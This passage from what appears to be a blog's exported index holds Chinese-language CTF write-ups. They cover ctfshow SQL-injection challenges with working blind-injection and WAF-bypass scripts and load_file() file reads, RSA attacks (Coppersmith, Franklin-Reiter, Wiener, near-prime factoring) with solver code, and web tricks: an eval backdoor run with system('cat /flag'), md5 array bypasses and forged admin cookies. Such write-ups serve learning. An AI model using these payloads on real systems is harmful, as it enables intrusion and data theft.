&#x27;&#125;&#x27;: exit() break 跑完就得到flag了 web 184查询语句 12&#x2F;&#x2F;拼接sql语句查找指定ID用户 $sql &#x3D; &quot;select count(*) from &quot;.$_POST[&#39;tableName&#39;].&quot;;&quot;; 返回逻辑 1234&#x2F;&#x2F;对传入的参数进行了过滤 function waf($str)&#123; return preg_match(&#39;&#x2F;\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\x00|\\#|\\x23|file|\\&#x3D;|or|\\x7c|select|and|flag|into|where|\\x26|\\&#39;|\\&quot;|union|\\&#96;|sleep|benchmark&#x2F;i&#39;, $str); &#125; 查询结果 12&#x2F;&#x2F;返回用户表的记录总数 $user_count &#x3D; 0; 这题连where都过滤掉了, 还剩下一个可以用来设定条件的on, 如果要用on的, 需要用到多表联合查询JOIN, 在两个表(依旧是同一个表)中查询, 生成的临时表中就可以用on 不管是INNER JOIN还是LEFT JOIN或者是RIGHT JOIN都无所谓, 只需要猜flag正确的时候回显不同即可, 因为这题没有过滤掉空格, 构造payload:tableName=ctfshow_user as a inner join ctfshow_user as b on substr(b.pass,num,1)regexp(char(str)), 其中num就是flag的位数, str就是猜测的字符 , 因为知道flag前缀是ctfshow&#123;, 所以从第9位开始猜就行了 12345678910111213141516171819202122import requestsimport reurl = &#x27;http://87deffe2-4291-41ac-b76b-1bcaf046e697.chall.ctf.show:8080/select-waf.php&#x27;Str = &#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#x27;data = &#123; &#x27;tableName&#x27;: &quot;ctfshow_user as a right join ctfshow_user as b on substr(b.pass,&#123;&#125;,1)regexp(char(&#123;&#125;))&quot;&#125;num = 9flag = &#x27;ctfshow&#123;&#x27;while True: for i in Str: Data = &#123; &#x27;tableName&#x27;: data[&#x27;tableName&#x27;].format(num, ord(i)) &#125; resp = requests.post(url=url, data=Data) if re.findall(&#x27;\\$user_count = (\\d*)&#x27;, resp.content.decode())[0] == &#x27;43&#x27;: flag += i print(flag) if i == &#x27;&#125;&#x27;: exit() num += 1 web 185 186在184的基础上过滤掉了数字, 也就是说payload里面不能出现数字, 可以用true+true+true….来构造想要的数字, 如99就是99个true相加, 利用这个继续写脚本得到flag 从Y4博客找到一张图 1234567891011121314151617181920212223import requestsimport reurl = &#x27;http://2f2306e9-b139-4243-b9be-ff87dacd631c.chall.ctf.show:8080/select-waf.php&#x27;Str = &#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#x27;data = &#123; &#x27;tableName&#x27;: &quot;ctfshow_user as a right join ctfshow_user as b on substr(b.pass,&#123;&#125;,true)regexp(char(&#123;&#125;))&quot;&#125;num = 9flag = &#x27;ctfshow&#123;&#x27;while True: for i in Str: Data = &#123; &#x27;tableName&#x27;: data[&#x27;tableName&#x27;].format((num*&#x27;true+&#x27;)[:-1], (ord(i)*&#x27;true+&#x27;)[:-1]) &#125; resp = requests.post(url=url, data=Data) if re.findall(&#x27;\\$user_count = (\\d*)&#x27;, resp.content.decode())[0] == &#x27;43&#x27;: flag += i print(flag) if i == &#x27;&#125;&#x27;: exit() num += 1 web 187以前做过的md5($password,true) 可以去看看 jarvis oj - login, 一个很神奇的字符串ffifdyop 1$sql = &quot;select count(*) from ctfshow_user where username = $_POST[&#x27;username&#x27;] and password= md5($_POST[&#x27;password&#x27;],true)&quot;; md5(&#39;ffifdyop&#39;,true) = &quot;&#39;or&#39;6xxxxxxx&quot; web 188先pass , 有点奇怪 web 189查询语句 12//拼接sql语句查找指定ID用户$sql = &quot;select pass from ctfshow_user where username = &#123;$username&#125;&quot;; 返回逻辑 12345678910111213141516//用户名检测if(preg_match(&#x27;/select|and| |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\x26|\\x7c|or|into|from|where|join|sleep|benchmark/i&#x27;, $username))&#123; $ret[&#x27;msg&#x27;]=&#x27;用户名非法&#x27;; die(json_encode($ret));&#125;//密码检测if(!is_numeric($password))&#123; $ret[&#x27;msg&#x27;]=&#x27;密码只能为数字&#x27;; die(json_encode($ret));&#125;//密码判断if($row[&#x27;pass&#x27;]==$password)&#123; $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;; &#125; hint: flag在api/index.php文件中 学习到了一些sql注入可能用到的函数: if(exp1,exp2,exp3), 当exp1为TRUE时函数返回exp2, 反之返回exp3, 可搭配一些字符串比较函数来进行盲注 load_file(file_name), 读取一个文件并将其内容作为字符串返回, 用于读取外部文件 locate(substr,str), 返回字符串str第一次出现子串substr的位置 strcmp(str1,str2),如果这两个字符串相等返回0，如果第一个参数是根据当前的排序顺序比第二较小则返回-1，否则返回1 hint已经告诉了我们flag在文件index.php中, 要在sql中读取文件, 可以使用load_file(), 所以要在username =&#123;$username&#125;处执行load_file()且判断出flag是啥. 注意到$username没有被引号包着, 所以如果$username是语句是可以执行的. 这里要用if()和一些字符串你处理的函数来对flag进行盲注. 当username=1&amp;password=0时返回的是查询失败而当username=0&amp;password=0时返回的是密码错误, 可以根据这个回显来对flag进行判断. 首先, 先找到flag在文件中的位置, 因为前缀是ctfshow{ ,所以根据这个来找到flag的位置. 12345678910111213def findindex(): Index = 1 url = &#x27;http://67064451-541b-444f-8c0e-c71be0d43b7f.chall.ctf.show:8080/api/&#x27; while True: data = &#123; &#x27;username&#x27;: &quot;if(locate(&#x27;ctfshow&#123;&#x27;,&quot; + &quot;load_file(&#x27;/var/www/html/api/index.php&#x27;))&gt;&#123;&#125;,0,1)&quot;.format(Index), &#x27;password&#x27;: &#x27;0&#x27; &#125; resp = requests.post(url=url, data=data) if &quot;\\\\u5bc6\\\\u7801\\\\u9519\\\\u8bef&quot; in resp.content.decode(): Index += 1 else: return Index + 8 然后根据上面得到的flag的起始位置开始猜flag, 最终脚本为 123456789101112131415161718192021222324252627282930313233343536import requestsurl = &#x27;http://67064451-541b-444f-8c0e-c71be0d43b7f.chall.ctf.show:8080/api/&#x27;Str = &#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#x27;flag = &#x27;ctfshow&#123;&#x27;def findindex(): Index = 1 while True: data = &#123; &#x27;username&#x27;: &quot;if(locate(&#x27;ctfshow&#123;&#x27;,&quot; + &quot;load_file(&#x27;/var/www/html/api/index.php&#x27;))&gt;&#123;&#125;,0,1)&quot;.format(Index), &#x27;password&#x27;: &#x27;0&#x27; &#125; resp = requests.post(url=url, data=data) if &quot;\\\\u5bc6\\\\u7801\\\\u9519\\\\u8bef&quot; in resp.content.decode(): Index += 1 else: return Index + 8Index = findindex()while True: for i in Str: data = &#123; &#x27;username&#x27;: &quot;if(strcmp(&#x27;&#123;&#125;&#x27;,substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),&#123;&#125;,1))=0,0,1)&quot;.format(i, Index), &#x27;password&#x27;: &#x27;0&#x27; &#125; resp = requests.post(url=url, data=data) if &quot;\\\\u5bc6\\\\u7801\\\\u9519\\\\u8bef&quot; in resp.content.decode(): flag += i Index += 1 print(flag) if i == &#x27;&#125;&#x27;: exit()","tags":[{"name":"Summary","slug":"Summary","permalink":"http://tearsjin.github.io/tags/Summary/"},{"name":"Web","slug":"Web","permalink":"http://tearsjin.github.io/tags/Web/"},{"name":"ctfshow","slug":"ctfshow","permalink":"http://tearsjin.github.io/tags/ctfshow/"}]},{"title":"HITCTF2020 ezRSA - The learing or Coppersmith attack","date":"2020-12-10T03:49:56.000Z","path":"2020/12/10/HITCTF2020-ezRSA-The-learing-or-Coppers/","text":"关于出去玩只能在手机上用Sage Cell Server做题那件事也是好久没写博客了, 刚好学习一下coppersmith attack 先把题目放上来吧 123456789101112131415161718192021222324252627282930313233#! /bin/bash python2from flag import flagfrom Crypto.Util.number import *import osflag = flag+os.urandom(32)p = getPrime(512)q = getPrime(512)n = p*qe = 3phi = (p-1)*(q-1)d = inverse(e,phi)m1 = bytes_to_long(flag)m2 = bytes_to_long(flag+os.urandom(8))assert pow(m1,3) &gt; nc1 = pow(m1,e,n)c2 = pow(m2,e,n)print &quot;c1 = %d&quot;%c1print &quot;c2 = %d&quot;%c2print &quot;n = %d&quot;%n&#x27;&#x27;&#x27;c1 = 80653989110793139102855968265870741534421660712327094406252902072101613222389965470648960909763762225046314865847982289607336162281576790259047039000290839621007818742162307587677505606906923990312494483089046762906753345262127057162580025978324312642501118741099945205580088180943278903718853065363662232083c2 = 5400424653941721880728309040044485787870754570249463205700803061685717472238274158687499478247752712211743180931379853481727502849946080245130393042405383007613277703993980940893569303012323853427216643473698166348237252515222556282004058588218846910754415888401275689026778751805826968590155607937830708498n = 92782661709340169703868140576276816382956055756557631391697803785121887338308072309948803413610339884338861040226250478895118923994109662815448681629315227440953320952623296140315432654804940766553284237954507627610922864055435652884184926768295740697589798180602153344302964255974935777945481843144629875127&#x27;&#x27;&#x27; 做这个之前, 先来看看coppersmith attack(直接翻CTF wiki 对于单变量的方程(多变量的还没接触过, 能否使用coppersmith attack 就看变量是否满足上面这部分所提到的约束. 来分析一下这些约束, 对于一般的RSA列出模N意义下的多项式方程求解根的时候, 因为N往往是两个大素数的乘积, 那么N必定会有一个因子 $b$ 是满足 $b &gt; N^{0.5}$ 的, 所以一般 $β$ 是取0.4~0.6的 但是有需要注意的是, 有时候求解根并不是在模N的意义下进行的, 这个时候就需要慎重的考虑一下$β$的取值了 而对于 $δ$ , 也就是多项式的阶数, 阶数越小对根的约束就越宽松, 这也就是为什么CTF wiki上会有这么一句 所以, 判断是否可以使用coppersmith attack, 就看需要解的根是否足够小(一般通过题目所给的信息来判断根的位数, 再通过e 和 N 的位数,来判断是否可以使用coppersmith attack 需要注意的是!由于LLL是启发式算法, 所以有的时候解出来的根会不满足约束, 也就是说当需要解的根近乎足够小就可以试试coppersmith了 现在回到题目, 先来分析一下题目 这题先对flag进行了一次填充flag = flag+os.urandom(32), 如果flag太小是可能直接解出来的. 然后就是对明文进行加密,再进行一次填充再加密, 写成式子就是$$m^3 = c_1 \\ (mod \\ n) \\(2^{64}m + diff)^3 = c_2 \\ (mod \\ n )$$ 其实可以令M=2^64^m 和 $c_1 = 2^{192}c_1$, 就可以有$$M^3 = c_1 \\ (mod \\ n) \\(M + diff)^3 = c_2 \\ (mod \\ n)$$两个方程, 两个未知数, 肯定是可以解出根来的, 只不过是难不难解出来的问题了. 注意到这里的$diff$ 是64位的, 而$N$是1024位的, e=3也很小, 可以考虑试试coppersmith先解出$diff$. 事实上解$diff$用到的就是Coppersmith’s short-pad attack Coppersmith’s short-pad attack wiki上说的也很清楚了, 在对明文进行填充的时候, 如果填充的$diff$位数很少,就可以算出$diff$,只需要$diff &lt; N^{1/e}$, 就可以解出$diff$了. 在这里显然是满足的. 我们先把两个方程化成只有一个未知数$diff$的方程(代码里diff = xn ,然后用small_root()求解 12345678910111213141516171819202122232425C1 = 80653989110793139102855968265870741534421660712327094406252902072101613222389965470648960909763762225046314865847982289607336162281576790259047039000290839621007818742162307587677505606906923990312494483089046762906753345262127057162580025978324312642501118741099945205580088180943278903718853065363662232083C2 = 5400424653941721880728309040044485787870754570249463205700803061685717472238274158687499478247752712211743180931379853481727502849946080245130393042405383007613277703993980940893569303012323853427216643473698166348237252515222556282004058588218846910754415888401275689026778751805826968590155607937830708498n = 92782661709340169703868140576276816382956055756557631391697803785121887338308072309948803413610339884338861040226250478895118923994109662815448681629315227440953320952623296140315432654804940766553284237954507627610922864055435652884184926768295740697589798180602153344302964255974935777945481843144629875127C1=(C1*2**192)%ne = 3n1 = nPRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n1))PRx.&lt;xn&gt; = PolynomialRing(Zmod(n1))PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n1)) g1 = x**e - C1g2 = (x + y)**e - C2 q1 = g1.change_ring(PRZZ)q2 = g2.change_ring(PRZZ)h = q2.resultant(q1)h = h.univariate_polynomial()h = h.change_ring(PRx).subs(y=xn)h = h.monic()roots = h.small_roots(X=2**64, beta=0.4)diff = roots[0]# diff = 15325913216714639606 这里的small_root()的参数很重要, X是设置根的上界的, 这个要尽可能的接近根的大小, 这样求解出来的可能性才高. 而beta一般0.4~0.6就行了. 接下来就是算M了, 这个又是另外一个method - Franklin-Reiter related-message attack Franklin-Reiter related-message attack先来看看wiki上怎么说通俗一点就是, 当两个明文满足线性关系$M_2 = aM_1+b$的时候,$x - M_2$是两个方程$$g_1(x) = f(x)^e - C_1 \\ (mod \\ N) \\g_2(x) = x^e - C_2 \\ (mod \\ N)$$的一个公因式, 因此可以利用在多项式的欧几里得算法算出这个公因式$x - M_2$, 也就是我们要算的M 1234567891011x = PRx.gen() g1 = x**e - C1g2 = (x + diff)**e - C2# 辗转相除法求公因式while g2: g1, g2 = g2, g1 % g2g = g1.monic()# g = xn + 92782661709340169703868140576276816382956055756557631391697803785121887338308072309948803413610339884338855507056808173780823100612346393533355160251650215111996263513671265306614427524745781162849613136748611330041590288489365015322686961617690785110909682202890569108842866175345662756188830323253136519607M = -g[0] M算出来了别忘了除一个2^64(一开始为了方便计算所以把m放大了, 还好不影响解题, 以后做的时候要小心为了方便计算导致算不出根来, 所以最后的代码是 123456789101112131415161718192021222324252627282930313233343536373839404142C1 = 80653989110793139102855968265870741534421660712327094406252902072101613222389965470648960909763762225046314865847982289607336162281576790259047039000290839621007818742162307587677505606906923990312494483089046762906753345262127057162580025978324312642501118741099945205580088180943278903718853065363662232083C2 = 5400424653941721880728309040044485787870754570249463205700803061685717472238274158687499478247752712211743180931379853481727502849946080245130393042405383007613277703993980940893569303012323853427216643473698166348237252515222556282004058588218846910754415888401275689026778751805826968590155607937830708498n = 92782661709340169703868140576276816382956055756557631391697803785121887338308072309948803413610339884338861040226250478895118923994109662815448681629315227440953320952623296140315432654804940766553284237954507627610922864055435652884184926768295740697589798180602153344302964255974935777945481843144629875127C1=(C1*2**192)%ne = 3n1 = nPRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n1))PRx.&lt;xn&gt; = PolynomialRing(Zmod(n1))PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n1)) g1 = x**e - C1g2 = (x + y)**e - C2 q1 = g1.change_ring(PRZZ)q2 = g2.change_ring(PRZZ)h = q2.resultant(q1)h = h.univariate_polynomial()h = h.change_ring(PRx).subs(y=xn)h = h.monic()roots = h.small_roots(X=2**64, beta=0.4)diff = roots[0]x = PRx.gen() g1 = x**e - C1g2 = (x + diff)**e - C2 while g2: g1, g2 = g2, g1 % g2g = g1.monic()M = -g[0]h =hex(M*inverse_mod(2**64,n))[2:]s=&quot;&quot;for i in range(0,len(h),2): s+=chr(int(h[i:i+2],16))print(s)# s = HITCTF2020&#123;dde65d8adf22b5e1a0c0c10eff23c24c&#125;¤\u0002ÜZ[öã¯\u0004WÇîBA6#5\u000f~_ò± 0\u000eÇ·æî 一下子学了两个方法好爽啊, 在看到e很小的时候, 一定要想起coppersmith来.不过这些应该都算是基础的, 特别是coppersmith的使用感觉还有很多很深奥的地方,","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"Summary","slug":"Summary","permalink":"http://tearsjin.github.io/tags/Summary/"},{"name":"RSA","slug":"RSA","permalink":"http://tearsjin.github.io/tags/RSA/"},{"name":"Coppersmith attack","slug":"Coppersmith-attack","permalink":"http://tearsjin.github.io/tags/Coppersmith-attack/"}]},{"title":"wirteup for 2020 祥云杯 Crypto","date":"2020-11-23T13:29:58.000Z","path":"2020/11/23/wirteup-for-2020-祥云杯/","text":"只会做密码的菜鸡 Crypto0x01 SimpleRSA题目1234567891011121314151617181920from Crypto.Util.number import *import gmpy2p, q, r = [getPrime(512) for i in range(3)]n = p * q * rphi = (p - 1) * (q - 1) * (r - 1)d = getPrime(256)e = gmpy2.invert(d , phi)flag = b&quot;flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot;c = pow(bytes_to_long(flag), e, n)print(e, n)print(c)&#x27;&#x27;&#x27;1072295425944136507039938677101442481213519408125148233880442849206353379681989305000570387093152236263203395726974692959819315410781180094216209100069530791407495510882640781920564732214327898099944792714253622047873152630438060151644601786843683746256407925709702163565141004356238879406385566586704226148537863811717298966607314747737551724379516675376634771455883976069007134218982435170160647848549412289128982070647832774446345062489374092673169618836701679 18272219926928491792440698342738165657142765053052461034359628874615203817097399272230552399539651824512521947689357026280565870341738006058274240432816731836064787361899273777455753799088764564850168324168060292549727696173935602384943260789408422951530292853944917837123849901251007745964770644822808294078560148352317117889900666765344144147410677595641023316146667137970738112450995121305286004640994927346716890849900360778600422384549089608415951071229331731079929174110820494059355415059104229905268763089157771374657932646711017488701536460687319648362549563313125268069722412148023885626962640915852317297916421725818077814237292807218952574111141918158391190621362508862842932945783059181952614317289116405878741758913351697905289993651105968169193211242144991434715552952340791545323270065763529865010326192824334684413212357708275259096202509042838081150055727650443887438253964607414944245877904002580997866300452&#x27;&#x27;&#x27; 思路说实话这题能做出来也是运气好…wiener还没有自己复现过, 一直都是用现成的脚本. 而这次的n是多个素因子的, 之前的脚本不能用了. 本来是想着去学一下怎么复现的, 结果直接找到原题了(祥云杯好像挺多都能找到原题或者是很像的题的 这是找到的原题的wp 直接抄脚本就能算出d了, 所以到底该怎么写wiener呢? 咕咕咕…有空一定学会它! 代码12345678910111213141516171819202122232425262728293031323334def hex2text(Hex): if len(Hex) % 2: Hex = &#x27;0&#x27; + Hex return &#x27;&#x27;.join([chr(int(b, 16)) for b in [Hex[i:i + 2] for i in range(0, len(Hex), 2)]])def dec2text(Dec): Hex = hex(Dec)[2:] return hex2text(Hex)def wiener(e, n): m = 12345 c = pow(m, e, n) q0 = 1 list1 = continued_fraction(Integer(e) / Integer(n)) conv = list1.convergents() for i in conv: k = i.numerator() q1 = i.denominator() for r in range(20): for s in range(20): d = r * q1 + s * q0 m1 = pow(c, d, n) if m1 == m: return d q0 = q1c = 1079929174110820494059355415059104229905268763089157771374657932646711017488701536460687319648362549563313125268069722412148023885626962640915852317297916421725818077814237292807218952574111141918158391190621362508862842932945783059181952614317289116405878741758913351697905289993651105968169193211242144991434715552952340791545323270065763529865010326192824334684413212357708275259096202509042838081150055727650443887438253964607414944245877904002580997866300452e = 1072295425944136507039938677101442481213519408125148233880442849206353379681989305000570387093152236263203395726974692959819315410781180094216209100069530791407495510882640781920564732214327898099944792714253622047873152630438060151644601786843683746256407925709702163565141004356238879406385566586704226148537863811717298966607314747737551724379516675376634771455883976069007134218982435170160647848549412289128982070647832774446345062489374092673169618836701679n = 1827221992692849179244069834273816565714276505305246103435962887461520381709739927223055239953965182451252194768935702628056587034173800605827424043281673183606478736189927377745575379908876456485016832416806029254972769617393560238494326078940842295153029285394491783712384990125100774596477064482280829407856014835231711788990066676534414414741067759564102331614666713797073811245099512130528600464099492734671689084990036077860042238454908960841595107122933173d = wiener(e,n)print(dec2text(pow(c,d,n))) 0x02 RSAssss题目1234567891011121314151617from Crypto.Util.number import *from gmpy2 import next_primep = getPrime(512)q = getPrime(512)n = p * q * next_prime(p) * next_prime(q)e = 0x10001flag = b&quot;flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot;cipher = pow(bytes_to_long(flag), e, n)print(n, cipher)&#x27;&#x27;&#x27;8030860507195481656424331455231443135773524476536419534745106637165762909478292141556846892146553555609301914884176422322286739546193682236355823149096731058044933046552926707682168435727800175783373045726692093694148718521610590523718813096895883533245331244650675812406540694948121258394822022998773233400623162137949381772195351339548977422564546054188918542382088471666795842185019002025083543162991739309935972705871943787733784491735500905013651061284020447578230135075211268405413254368439549259917312445348808412659422810647972872286215701325216318641985498202349281374905892279894612835009186944143298761257 3304124639719334349997663632110579306673932777705840648575774671427424134287680988314129312593361087606243819528298610131797078262351307396831985397555390640151391138633431951746748156610463582479645561779194981806129898009876517899450840875569675976765155608446799203699927448835004756707151281044859676695533373755798273892503194753948997947653100690841880925445059175494314198605475023939567750409907217654291430615102258523998394231436796902635077995829477347316754739938980814293304289318417443493019704073164585505217658570214989150175123757038125380996050761572021986573934155470641091678664451080065719261207&#x27;&#x27;&#x27; 思路费马分解! 我怎么会没想到呢, 两个接近的因子就可以用fermat了.这题也是运气好,在这个大数分解网站后台跑了两个钟分出两半来了(真的是没注意放后台跑的 分出的两半: 12x1 &#x3D; 89615068527538836315602124154008300286636934599617334867509053076622715365809371740037316558871796433906844464070995869293654082577887578197182408045175035339285085728002838220314068474670975228778464240088084331807420720121364486765011169669747553393661650912114228227308579940164269877101973728452252879383x2 &#x3D; 89615068527538836315602124154008300286636934599617334867509053076622715365809371740037316558871796433906844464070995869293654082577887578197182408045172781798703173650574737644914515591522256758848089955578713458715234536664415216526830967831862301518636586702212189087959136509334102772855657664091570630079 考虑到np = next_prime(p)所以p和np不会相差太远, 可以有$np = p+a$ 不妨假设$$p&lt;p+a&lt;q&lt;q+b$$ 又因为p,q是随机生成的两个大素数, 他们相等的可能性太低. 而分出的x1, x2(x1&gt;x2)非常接近, 则x1,x2可能有的组合有$$x_1 = p(q+b) \\ x_2 = q(p+a)$$或者是$$x_1 = pq \\ x_2 = (p+a)(q+b)$$(可能还有没考虑到的?… 首先尝试第一种组合(直接中了x1和x2相减有$$x = x_1-x_2 = bp-aq$$消元$$p = {x \\over b} + {a \\over b}q \\x_2 ={a \\over v}q^2 + aq + {x \\over b}q$$ 则可以有关于q的二次方程$$aq^2 + (ab + x)q - bx_2 = 0$$ 因为解是整数, 所以delta应该为完全平方数$$\\Delta = (ab + x)^2 + 4abx_2$$ 所以利用这个特点可以爆破出a,b 从而解出q,再而就能有p,q+b , p+a了 (有一点不明白就是按理来说a,b只有1组?可能是我没考虑周到,跑出来4组a,b, 发现只有第四组跑出来的q是真正的q(其他三组都是kq), 所以直接采用第四组的q和a,b 想明白了! 因为二次项的系数是a, 如果a的因数里面有完全平方数$k^2$, 那么就可能解出kq这个解了! 求出n的四个素因子之后常规的RSA解密就行了 代码 12345678910111213141516171819202122232425262728293031323334353637383940# coding=utf-8from gmpy2 import iroot, gcd, invertfrom Crypto.Util.number import long_to_bytesn = 8030860507195481656424331455231443135773524476536419534745106637165762909478292141556846892146553555609301914884176422322286739546193682236355823149096731058044933046552926707682168435727800175783373045726692093694148718521610590523718813096895883533245331244650675812406540694948121258394822022998773233400623162137949381772195351339548977422564546054188918542382088471666795842185019002025083543162991739309935972705871943787733784491735500905013651061284020447578230135075211268405413254368439549259917312445348808412659422810647972872286215701325216318641985498202349281374905892279894612835009186944143298761257x1 = 89615068527538836315602124154008300286636934599617334867509053076622715365809371740037316558871796433906844464070995869293654082577887578197182408045175035339285085728002838220314068474670975228778464240088084331807420720121364486765011169669747553393661650912114228227308579940164269877101973728452252879383x2 = 89615068527538836315602124154008300286636934599617334867509053076622715365809371740037316558871796433906844464070995869293654082577887578197182408045172781798703173650574737644914515591522256758848089955578713458715234536664415216526830967831862301518636586702212189087959136509334102772855657664091570630079x = x1 - x2for a in range(1, 2000): for b in range(1, 2000): delta_sq = (x + a * b) ** 2 + 4 * a * b * x2 delta = iroot(delta_sq, 2) if delta[1]: p1 = (-(a * b + x) + delta[0]) // (2 * a) p2 = (-(a * b + x) - delta[0]) // (2 * a) if p1 &gt; 0 and gcd(p1, n) != 1: print(p1, a, b) if p2 &gt; 0 and gcd(p2, n) != 1: print(p2, a, b)&#x27;&#x27;&#x27; result: 59509622824623675050066481062107171504849863374230362259884081452647743246974989796952759980519162117328441285479164180294347299033843912200899999033032168 1 1536 29754811412311837525033240531053585752424931687115181129942040726323871623487494898476379990259581058664220642739582090147173649516921956100449999516516084 2 768 14877405706155918762516620265526792876212465843557590564971020363161935811743747449238189995129790529332110321369791045073586824758460978050224999758258042 4 384 7438702853077959381258310132763396438106232921778795282485510181580967905871873724619094997564895264666055160684895522536793412379230489025112499879129021 8 192&#x27;&#x27;&#x27;q = 7438702853077959381258310132763396438106232921778795282485510181580967905871873724619094997564895264666055160684895522536793412379230489025112499879129021np = x2 // qnq = q + 192p = np - 8e = 0x10001c = 3304124639719334349997663632110579306673932777705840648575774671427424134287680988314129312593361087606243819528298610131797078262351307396831985397555390640151391138633431951746748156610463582479645561779194981806129898009876517899450840875569675976765155608446799203699927448835004756707151281044859676695533373755798273892503194753948997947653100690841880925445059175494314198605475023939567750409907217654291430615102258523998394231436796902635077995829477347316754739938980814293304289318417443493019704073164585505217658570214989150175123757038125380996050761572021986573934155470641091678664451080065719261207phi = (p - 1) * (q - 1) * (np - 1) * (nq - 1)d = invert(e, phi)print(long_to_bytes(pow(c, d, n))) 这道题算的时候还算轻松的, 猜出组合之后用delta爆破也不是第一次做了 总结还是太菜…能做的就只有简单的…剩下的密码题还有 more_calc Exposure easy matrix Blowfish more_calc 看过了Nu1l的WP, S确实是可以用别的办法算的…这几天一定要把原理搞懂(这个应该不难 Exposure和easy matrix都是需要用到LLL的知识的…这个真的还没学会 吃了大亏, 格理论真的要好好的去查一查资料了特别是Exposure…论文都查到了!就是因为不会LLL就不会做了(好菜啊 一定要学会LLL! Blowfish 第一次接触Blowfish, 先暂时放着吧.. 真の总结很多理论知识还没有学会吧. 真的感觉题目是水的, 自己菜做不出来而已.然后就是关于RSA, 做了这次明白了其实很多时候用到的方法都是已经学过的, 观察题目给的条件的特点, 再想想自己会的方法的特点(费马分两个接近pq, wiener适合特别大的e等等. 这样做的可能会更有思路更快一点","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"RSA","slug":"RSA","permalink":"http://tearsjin.github.io/tags/RSA/"},{"name":"Lattice","slug":"Lattice","permalink":"http://tearsjin.github.io/tags/Lattice/"},{"name":"WriteUp","slug":"WriteUp","permalink":"http://tearsjin.github.io/tags/WriteUp/"}]},{"title":"wirteup for 2020 新生杯","date":"2020-11-12T01:05:28.000Z","path":"2020/11/12/wirteup-for-2020-新生杯/","text":"这次顶着桐老爷的id(kirito zbds, 本来只是想着做做Web和尝试做完Crypto的(结果没有做完,有趣的加密是真的有趣, 结果发现不做Misc分不太够, 就肝了几道, 还是学到了不少东西的. 所以先来个目录吧(pwn真的是一道都不会嗯…: Web 假的签到 世界上最简单的后门 Let’s play a simple game again lottery_revenge unserialize 又一个后门 babysql babyssrf OSINT checkin REVERSE 捉迷藏 basic_hash ByteCode Misc 真·签到 Look_at_your_keyboard Buddha Do you know Xp0int close_base PMGBA 集齐五龙珠 Cyrpto 碰碰车 EasyRSA Go Home block cipher ant forest Web假的签到robots! robots! robots! robots协议这个协议里面是用来设定一些网站里不能被搜索引擎获取的内容的(不过CTF里就变成提示做题人方向的一个文件了?一般拿到web说不定robots.txt里面就有提示呢不过大概率是没有的 所以马上进/robots.txt看看, 里面有个提示:/phpp_tql.php访问/phpp_tql.php有一段源码看了下是关于md5的比较的,因为是===, 肯定不会是弱类型了, 想起之前就挖过一个坑某篇MD5的总结, 所以很快就想到用数组来做了. 当a和b都是数组的时候, md5(a) === md5(b) 会判断为真.利用这个就可以构造payload: ?phpp[]=1&amp;hphh[]=2 世界上最简单的后门啊这, eval()真的很安全的.关于直接把用户的输入直接放在eval()中导致目录都被翻了个遍这档事(也没想太多, 手动翻了一下目录(dalao都是直接搜索flag的往上翻一个目录system(&#39;ls /&#39;);就发现有flag了于是掏出hackbar(POST) c=system(&#39;cat /flag&#39;); Let’s play a simple game again开头根据要求GET和POST传参就行了.但是这里好像出了一个小问题. 做题的时候都是想着怎么做快就怎么做. 于是给主办方提交wp的时候似乎遗漏了什么(不要打我我真的是后来才发现的… 不是admin就进不去吗! 其实第一想法应该就是X-Forwarded-For改127.0.0.1的, 然而我直接去看Cookies了, 也没有改XFF(X-Forwarded-For 发现Cookies: YWRtaW49MA==, 两个等号十有八九是base64了, 扔去base64解码出来的是admin=0, 想着让Cookies为admin=1应该没问题了. 所以将Cookies改成YWRtaW49MQ==, 就拿到Welcome admin! Here is your flag:ctf&#123;Have_4_n1ce_c0mpetition!&#125;了. 然而…事情并没有这么简单, 昨天某御坂大佬发了自己的wp之后我发现, 什么???X-Forwarded-For要改127.0.0.1???, 我没改怎么拿到flag了???于是看了看自己的firefox插件…屮…原来是之前做了题就没有关掉这个, 导致自己一直都是127.0.0.1…所以直接就出flag了…但是wp已经提交了啊! 也没办法改了, 说实话有点慌… lottery_revenge去年也有抽奖, 一样的页面, 不一样的味道…(伪随机数的攻击居然在web里面出现了… 因为去年做过, 所以上来直接就开抽了(burpsuite永远的神, 但是发现不断访问data.php都是同一个响应, 有点不太对劲.所以看了看响应发现了一段注释 啊…抽奖它, 它升级了.要求$_POST[&#39;admin_key&#39;]==$_SESSION[&#39;key&#39;] session就是时间戳吧. 第一个想法是先取现在的时间戳加上一个常数然后不停访问. 但是怎样都访问不成功(事实上就算访问成功了也就抽了一次奖, 下一次还得重新构造新的时间戳… 其实这里卡了一段时间(我也不知道自己到底爆破了多久…, 发现怎样都不行后就去看了下$_SESSION变量有没有什么可以利用的特性或者漏洞. 还真就发现了一个特性:当用户第一次访问的时候,$_SESSION的所有变量都是为空的(就是说初始化为空嘛, 可以看一下源码, 给$_SESSION[&#39;key&#39;]赋值是在一次访问之后, 所以! 只需要不带Cookies以及带上空的admin_key访问data.php就可以开始抽奖啦.抽出结果还是很开心的, 但是结果还需要下一步… 离谱, 按着提示进去 一开始没懂这个页面要我干嘛, 看看注释有没有提示, 发现下面有个source=1dddd, ?source=1看源码 大概是说随机生成30个数, 对应一个表中的30个字母生成一个随机的字符串, 给出前11位猜整个字符串. 毕竟做了挺多伪随机数的题了, 看到mt_rand()就想起之前差点没把我整吐的MT-19937.(当种子设定每次随机出来的数都是一模一样是不是很神奇啊! N1CTF那道伪随机数还历历在目. 所以说, 理论上知道随机数前面的几位输出是可以逆推回种子的(有时候需要足够多的输出才能得到种子, 